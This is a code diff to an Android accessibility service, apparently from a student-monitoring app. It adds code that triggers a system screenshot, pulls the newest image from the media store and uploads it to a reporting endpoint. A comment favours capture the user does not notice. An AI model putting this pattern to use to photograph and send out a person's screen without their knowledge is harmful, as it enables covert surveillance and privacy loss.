@@ -2,18 +2,28 @@ package com.example.test_filesync.service;
 
 import com.example.test_filesync.StudentApplication;
 import com.example.test_filesync.util.LogUtils;
+import com.example.test_filesync.util.FileUpload;
+import com.example.test_filesync.api.ApiCallback;
+import com.example.test_filesync.api.ApiConfig;
 import android.accessibilityservice.AccessibilityService;
 import android.content.ComponentName;
 import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.database.Cursor;
 import android.net.Uri;
 import android.os.Handler;
 import android.os.Looper;
+import android.provider.MediaStore;
 import android.provider.Settings;
 import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityNodeInfo;
 import android.widget.Toast;
+import java.io.ByteArrayOutputStream;
+import java.io.InputStream;
+import java.text.SimpleDateFormat;
+import java.util.Date;
 import java.util.List;
+import java.util.Locale;
 import com.example.test_filesync.util.PullConfig;
 
 public class MyAccessibilityService extends AccessibilityService {
@@ -333,7 +343,122 @@ public class MyAccessibilityService extends AccessibilityService {
     // 触发截图的关键方法
     public void triggerScreenshot() {
         // 用户无感（无界面跳转/无弹窗提示）的实现应优先选择 performGlobalAction（Android 9+ 才支持，用户无需感知）
-        performGlobalAction(GLOBAL_ACTION_TAKE_SCREENSHOT);
+        boolean success = performGlobalAction(GLOBAL_ACTION_TAKE_SCREENSHOT);
+        
+        if (success) {
+            LogUtils.d(this, "截图触发成功，等待系统保存...");
+            Toast.makeText(this, "正在截图...", Toast.LENGTH_SHORT).show();
+            
+            // 延迟2秒后从相册获取截图并上传（等待系统保存截图）
+            handler.postDelayed(() -> {
+                getLatestScreenshotAndUpload();
+            }, 2000);
+        } else {
+            LogUtils.e(this, "截图触发失败");
+            Toast.makeText(this, "截图失败，请检查权限", Toast.LENGTH_SHORT).show();
+        }
+    }
+    
+    /**
+     * 从相册获取最新的截图并上传
+     */
+    private void getLatestScreenshotAndUpload() {
+        try {
+            // 查询最新的截图
+            Uri screenshotUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
+            String[] projection = {
+                MediaStore.Images.Media._ID,
+                MediaStore.Images.Media.DATA,
+                MediaStore.Images.Media.DATE_ADDED,
+                MediaStore.Images.Media.DISPLAY_NAME
+            };
+            
+            // 查询条件：只查询Screenshots目录或最近5秒内添加的图片
+            long currentTime = System.currentTimeMillis() / 1000;
+            String selection = MediaStore.Images.Media.DATE_ADDED + " > ?";
+            String[] selectionArgs = new String[] { String.valueOf(currentTime - 5) };
+            
+            // 按时间降序排列
+            String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";
+            
+            Cursor cursor = getContentResolver().query(
+                screenshotUri,
+                projection,
+                selection,
+                selectionArgs,
+                sortOrder
+            );
+            
+            if (cursor != null && cursor.moveToFirst()) {
+                int idColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
+                int nameColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME);
+                
+                long id = cursor.getLong(idColumn);
+                String fileName = cursor.getString(nameColumn);
+                Uri imageUri = Uri.withAppendedPath(screenshotUri, String.valueOf(id));
+                
+                cursor.close();
+                
+                LogUtils.d(this, "找到最新截图: " + fileName);
+                
+                // 读取图片数据
+                InputStream inputStream = getContentResolver().openInputStream(imageUri);
+                if (inputStream != null) {
+                    ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+                    byte[] buffer = new byte[4096];
+                    int bytesRead;
+                    while ((bytesRead = inputStream.read(buffer)) != -1) {
+                        outputStream.write(buffer, 0, bytesRead);
+                    }
+                    byte[] imageBytes = outputStream.toByteArray();
+                    inputStream.close();
+                    outputStream.close();
+                    
+                    // 上传截图
+                    uploadScreenshot(imageBytes, fileName);
+                } else {
+                    LogUtils.e(this, "无法读取截图文件");
+                    Toast.makeText(this, "读取截图失败", Toast.LENGTH_SHORT).show();
+                }
+            } else {
+                if (cursor != null) {
+                    cursor.close();
+                }
+                LogUtils.e(this, "未找到最新截图");
+                Toast.makeText(this, "未找到截图，请重试", Toast.LENGTH_SHORT).show();
+            }
+            
+        } catch (Exception e) {
+            LogUtils.e(this, "获取截图失败: " + e.getMessage());
+            Toast.makeText(this, "获取截图失败: " + e.getMessage(), Toast.LENGTH_SHORT).show();
+        }
+    }
+    
+    /**
+     * 上传截图
+     */
+    private void uploadScreenshot(byte[] imageBytes, String originalFileName) {
+        // 生成带时间戳的文件名
+        String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date());
+        String fileName = "screenshot_" + timestamp + ".jpg";
+        
+        LogUtils.d(this, "开始上传截图: " + fileName + ", 大小: " + imageBytes.length + " bytes");
+        Toast.makeText(this, "正在上传截图...", Toast.LENGTH_SHORT).show();
+        
+        FileUpload fileUpload = new FileUpload(getApplicationContext());
+        fileUpload.uploadImage(ApiConfig.report_screenshot, imageBytes, fileName, new ApiCallback() {
+            @Override
+            public void onSuccess(String result) {
+                LogUtils.d(MyAccessibilityService.this, "截图上传成功: " + result);
+                Toast.makeText(MyAccessibilityService.this, "截图上传成功", Toast.LENGTH_SHORT).show();
+            }
+            
+            @Override
+            public void onFailure(Exception e) {
+                LogUtils.e(MyAccessibilityService.this, "截图上传失败: " + e.getMessage());
+                Toast.makeText(MyAccessibilityService.this, "截图上传失败: " + e.getMessage(), Toast.LENGTH_SHORT).show();
+            }
+        });
     }
 
     /**
